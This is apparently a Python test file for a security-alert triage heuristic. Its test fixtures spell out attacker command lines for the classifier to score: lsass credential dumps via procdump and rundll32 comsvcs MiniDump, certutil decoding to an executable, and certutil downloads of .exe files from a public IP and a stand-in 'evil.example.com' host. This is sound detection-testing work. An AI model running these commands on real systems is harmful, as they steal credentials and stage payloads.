"""Heuristic provider: the deterministic baseline and fallback.

The heuristic is only a fair baseline if it is *context-aware*, so these tests
pin the behaviours that separate it from a naive tool+flag matcher:

* credential-access against lsass fires — unless the process is a signed EDR
  sensor (a documented regression: the exclusion must survive refactors);
* ``certutil -decode`` only escalates when it decodes to an *executable*, not
  when the ``.exe`` merely appears inside ``certutil.exe`` (a fixed bug);
* download verdicts depend on the *destination* (raw public IP vs internal);
* routine single discovery commands are closed as false positives.

Determinism is also asserted: the same alert must always score identically.
"""

from __future__ import annotations

import pytest

from socrepo.models import NextAction, Verdict
from socrepo.triage.providers import HeuristicProvider, _classify_destination


@pytest.fixture
def provider() -> HeuristicProvider:
    return HeuristicProvider()


# --------------------------------------------------------------------------- #
# Destination classification (pure function, high leverage)
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "cmd,expected",
    [
        ("certutil -urlcache -f http://8.8.4.4/x.exe x.exe", "raw_public_ip"),
        ("certutil -urlcache -f http://10.0.0.5/x.exe x.exe", "internal"),
        ("certutil -urlcache -f https://evil.example.com/x.exe x.exe", "public_host"),
        ("certutil -urlcache -f https://raw.githubusercontent.com/a/b x", "reputable"),
        ("certutil -urlcache -f http://fileserver.corp/x.exe x.exe", "internal"),
        ("whoami /all", "none"),
    ],
)
def test_destination_classification(cmd: str, expected: str):
    assert _classify_destination(cmd) == expected


# --------------------------------------------------------------------------- #
# Credential access
# --------------------------------------------------------------------------- #
def test_procdump_lsass_is_true_positive(provider, make_alert):
    alert = make_alert(
        image="C:\\Tools\\procdump64.exe",
        command_line="procdump64.exe -accepteula -ma lsass.exe C:\\temp\\l.dmp",
        technique_id="T1003.001",
    )
    r = provider.triage(alert)
    assert r.verdict is Verdict.TRUE_POSITIVE
    assert r.next_action in (NextAction.ESCALATE, NextAction.ISOLATE_HOST)


def test_comsvcs_minidump_by_pid_is_true_positive(provider, make_alert):
    """comsvcs MiniDump by PID never names 'lsass' — must still be caught."""
    alert = make_alert(
        image="C:\\Windows\\System32\\rundll32.exe",
        command_line=(
            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 "
            "C:\\temp\\out.dmp full"
        ),
        technique_id="T1003.001",
    )
    r = provider.triage(alert)
    assert r.verdict is Verdict.TRUE_POSITIVE


def test_signed_edr_sensor_touching_lsass_is_not_credential_dump(provider, make_alert):
    """Regression: a signed EDR sensor inspecting lsass must be excluded from
    the credential-dump signal, or every endpoint agent becomes a TP."""
    alert = make_alert(
        image="C:\\Program Files\\CrowdStrike\\edr\\falcon-sensor.exe",
        command_line="falcon-sensor.exe --scan comsvcs minidump lsass telemetry",
        parent_image="C:\\Windows\\System32\\services.exe",
        user="NT AUTHORITY\\SYSTEM",
        signed=True,
    )
    r = provider.triage(alert)
    assert r.verdict is not Verdict.TRUE_POSITIVE


# --------------------------------------------------------------------------- #
# certutil decode — the fixed substring bug
# --------------------------------------------------------------------------- #
def test_certutil_decode_to_executable_escalates(provider, make_alert):
    alert = make_alert(
        image="C:\\Windows\\System32\\certutil.exe",
        command_line="certutil.exe -decode C:\\users\\public\\a.b64 C:\\users\\public\\a.exe",
        technique_id="T1140",
    )
    r = provider.triage(alert)
    assert r.verdict is Verdict.TRUE_POSITIVE


def test_certutil_decode_to_benign_file_does_not_escalate(provider, make_alert):
    """The '.exe' inside 'certutil.exe' must NOT trigger decode-to-exe. Decoding
    to a .txt is not, by itself, a true positive."""
    alert = make_alert(
        image="C:\\Windows\\System32\\certutil.exe",
        command_line="certutil.exe -decode C:\\users\\public\\a.b64 C:\\users\\public\\a.txt",
        technique_id="T1140",
    )
    r = provider.triage(alert)
    assert r.verdict is not Verdict.TRUE_POSITIVE


# --------------------------------------------------------------------------- #
# Download destination drives the verdict
# --------------------------------------------------------------------------- #
def test_download_from_raw_public_ip_is_true_positive(provider, make_alert):
    alert = make_alert(
        image="C:\\Windows\\System32\\certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://8.8.4.4/b.exe b.exe",
        technique_id="T1105",
    )
    r = provider.triage(alert)
    assert r.verdict is Verdict.TRUE_POSITIVE


def test_download_from_internal_host_stays_in_benign_band(provider, make_alert):
    alert = make_alert(
        image="C:\\Windows\\System32\\certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://10.0.0.5/tool.exe tool.exe",
        technique_id="T1105",
    )
    r = provider.triage(alert)
    assert r.verdict is Verdict.BENIGN_SUSPICIOUS


# --------------------------------------------------------------------------- #
# Discovery / read-only management → false positive
# --------------------------------------------------------------------------- #
def test_bare_whoami_is_false_positive(provider, make_alert):
    alert = make_alert(
        image="C:\\Windows\\System32\\whoami.exe",
        command_line="whoami.exe",
        technique_id="T1033",
    )
    r = provider.triage(alert)
    assert r.verdict is Verdict.FALSE_POSITIVE
    assert r.next_action is NextAction.CLOSE


def test_wmic_query_only_is_false_positive(provider, make_alert):
    alert = make_alert(
        image="C:\\Windows\\System32\\wbem\\wmic.exe",
        command_line="wmic.exe csproduct get name",
        technique_id="T1047",
    )
    r = provider.triage(alert)
    assert r.verdict is Verdict.FALSE_POSITIVE


# --------------------------------------------------------------------------- #
# Contract: always available, deterministic, zero-cost
# --------------------------------------------------------------------------- #
def test_provider_is_always_available(provider):
    assert provider.available() is True


def test_triage_is_deterministic(provider, make_alert):
    alert = make_alert(
        image="C:\\Windows\\System32\\certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://8.8.4.4/b.exe b.exe",
    )
    r1 = provider.triage(alert)
    r2 = provider.triage(alert)
    assert (r1.verdict, r1.confidence, r1.next_action) == (
        r2.verdict, r2.confidence, r2.next_action
    )
    assert r1.cost_usd == 0.0
